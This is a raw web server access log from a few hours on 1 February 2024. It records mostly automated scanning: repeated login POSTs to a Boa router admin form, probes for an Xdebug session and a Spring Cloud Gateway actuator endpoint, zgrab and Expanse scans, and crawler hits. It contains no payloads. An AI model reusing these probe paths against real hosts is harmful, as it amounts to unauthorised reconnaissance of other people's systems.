94.156.66.21 - - [01/Feb/2024:02:47:11 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:02:47:11 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:02:53:04 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:02:53:04 +0000] "" 400 0 "-" "-"
43.163.1.85 - - [01/Feb/2024:02:55:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
94.156.66.21 - - [01/Feb/2024:03:00:05 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:03:00:05 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:03:02:49 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:03:02:49 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:03:04:47 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:03:04:47 +0000] "" 400 0 "-" "-"
179.43.161.130 - - [01/Feb/2024:03:07:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
192.155.88.231 - - [01/Feb/2024:03:12:51 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
94.156.66.21 - - [01/Feb/2024:03:14:25 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:03:14:25 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:03:18:18 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:03:18:18 +0000] "" 400 0 "-" "-"
34.125.218.125 - - [01/Feb/2024:03:22:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.218.125 - - [01/Feb/2024:03:22:20 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:03:25:04 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:03:25:04 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:03:30:51 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:03:30:51 +0000] "" 400 0 "-" "-"
45.79.168.172 - - [01/Feb/2024:03:33:08 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
94.156.66.229 - - [01/Feb/2024:03:33:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:03:33:41 +0000] "" 400 0 "-" "-"
83.97.73.245 - - [01/Feb/2024:03:35:25 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
43.133.72.69 - - [01/Feb/2024:03:37:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
15.204.182.106 - - [01/Feb/2024:03:38:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
94.156.66.21 - - [01/Feb/2024:03:38:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:03:38:57 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:03:44:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:03:44:03 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:03:44:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:03:44:08 +0000] "" 400 0 "-" "-"
190.211.252.66 - - [01/Feb/2024:03:45:41 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.79.181.251 - - [01/Feb/2024:03:53:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
94.156.66.229 - - [01/Feb/2024:03:54:26 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:03:54:27 +0000] "" 400 0 "-" "-"
107.170.252.41 - - [01/Feb/2024:03:58:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
94.156.66.21 - - [01/Feb/2024:03:59:12 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:03:59:12 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:04:04:01 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:04:04:01 +0000] "" 400 0 "-" "-"
135.148.195.6 - - [01/Feb/2024:04:05:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0"
190.211.252.66 - - [01/Feb/2024:04:07:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.21 - - [01/Feb/2024:04:07:35 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:04:07:35 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:04:16:23 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:04:16:23 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:04:19:02 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:04:19:02 +0000] "" 400 0 "-" "-"
66.249.68.37 - - [01/Feb/2024:04:20:33 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.68.36 - - [01/Feb/2024:04:20:58 +0000] "GET /ads.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
190.211.252.66 - - [01/Feb/2024:04:25:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.21 - - [01/Feb/2024:04:27:26 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:04:27:26 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:04:28:50 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:04:28:50 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:04:38:23 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:04:38:23 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:04:38:53 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:04:38:53 +0000] "" 400 0 "-" "-"
185.159.82.71 - - [01/Feb/2024:04:41:34 +0000] "GET /wp-content/plugins/essential-blocks/assets/css/react-select.min.css HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; Android 9; FLA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/59.1.2926.54067"
109.205.213.198 - - [01/Feb/2024:04:43:02 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
199.127.56.236 - - [01/Feb/2024:04:44:08 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36"
94.156.66.21 - - [01/Feb/2024:04:44:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:04:44:22 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:04:46:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:04:46:58 +0000] "" 400 0 "-" "-"
109.205.213.198 - - [01/Feb/2024:04:48:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
162.216.149.179 - - [01/Feb/2024:04:50:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
190.211.252.66 - - [01/Feb/2024:04:53:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.21 - - [01/Feb/2024:04:53:55 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:04:53:55 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:04:57:46 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:04:57:46 +0000] "" 400 0 "-" "-"
83.97.73.245 - - [01/Feb/2024:05:02:31 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
94.156.66.21 - - [01/Feb/2024:05:04:26 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:05:04:26 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:05:06:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:05:06:57 +0000] "" 400 0 "-" "-"
159.203.224.14 - - [01/Feb/2024:05:10:48 +0000] "MGLNDD_180.233.121.154_80" 400 154 "-" "-"
198.98.51.91 - - [01/Feb/2024:05:13:19 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
198.98.51.91 - - [01/Feb/2024:05:13:19 +0000] "" 400 0 "-" "-"
190.211.252.66 - - [01/Feb/2024:05:14:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.21 - - [01/Feb/2024:05:15:29 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:05:15:29 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:05:18:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:05:18:37 +0000] "" 400 0 "-" "-"
190.211.252.66 - - [01/Feb/2024:05:19:23 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.201 - - [01/Feb/2024:05:19:32 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
190.211.252.66 - - [01/Feb/2024:05:22:17 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.21 - - [01/Feb/2024:05:24:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:05:24:24 +0000] "" 400 0 "-" "-"
103.186.67.227 - - [01/Feb/2024:05:24:34 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
103.186.67.227 - - [01/Feb/2024:05:24:34 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:05:25:23 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:05:25:24 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [01/Feb/2024:05:26:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
190.211.252.66 - - [01/Feb/2024:05:27:23 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.201 - - [01/Feb/2024:05:28:41 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.201 - - [01/Feb/2024:05:34:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.229 - - [01/Feb/2024:05:34:48 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:05:34:49 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:05:37:36 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:05:37:36 +0000] "" 400 0 "-" "-"
190.211.252.66 - - [01/Feb/2024:05:38:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.229 - - [01/Feb/2024:05:43:06 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:05:43:06 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:05:44:27 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:05:44:28 +0000] "" 400 0 "-" "-"
190.211.252.66 - - [01/Feb/2024:05:56:00 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.229 - - [01/Feb/2024:05:56:11 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:05:56:12 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [01/Feb/2024:05:56:44 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0"
94.156.66.21 - - [01/Feb/2024:06:01:44 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:06:01:44 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:06:04:46 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:06:04:47 +0000] "" 400 0 "-" "-"
68.183.179.149 - - [01/Feb/2024:06:07:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
68.183.179.149 - - [01/Feb/2024:06:07:57 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:06:08:56 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:06:08:57 +0000] "" 400 0 "-" "-"
58.53.218.148 - - [01/Feb/2024:06:14:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
94.156.66.229 - - [01/Feb/2024:06:18:27 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:06:18:28 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:06:19:40 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:06:19:41 +0000] "" 400 0 "-" "-"
190.211.252.66 - - [01/Feb/2024:06:21:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.201 - - [01/Feb/2024:06:26:12 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
109.205.213.198 - - [01/Feb/2024:06:26:36 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
94.156.66.229 - - [01/Feb/2024:06:27:40 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:06:27:40 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:06:33:40 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:06:33:41 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:06:35:05 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:06:35:05 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [01/Feb/2024:06:38:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.180.143.6 - - [01/Feb/2024:06:41:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
94.156.66.229 - - [01/Feb/2024:06:49:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:06:49:03 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:06:49:11 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:06:49:12 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:06:53:53 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:06:53:53 +0000] "" 400 0 "-" "-"
107.151.243.170 - - [01/Feb/2024:06:57:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0"
107.151.243.170 - - [01/Feb/2024:06:57:19 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03O\xF0D\xF7W\xBFo\xD1[\xBA|" 400 154 "-" "-"
94.156.66.229 - - [01/Feb/2024:06:58:17 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:06:58:17 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:07:04:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:07:04:24 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:07:07:29 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:07:07:30 +0000] "" 400 0 "-" "-"
94.156.71.208 - - [01/Feb/2024:07:12:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.71.208 - - [01/Feb/2024:07:12:30 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:07:13:13 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:07:13:13 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:07:16:05 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:07:16:05 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:07:25:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:07:25:33 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:07:26:18 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:07:26:18 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:07:38:10 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:07:38:11 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:07:38:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:07:38:22 +0000] "" 400 0 "-" "-"
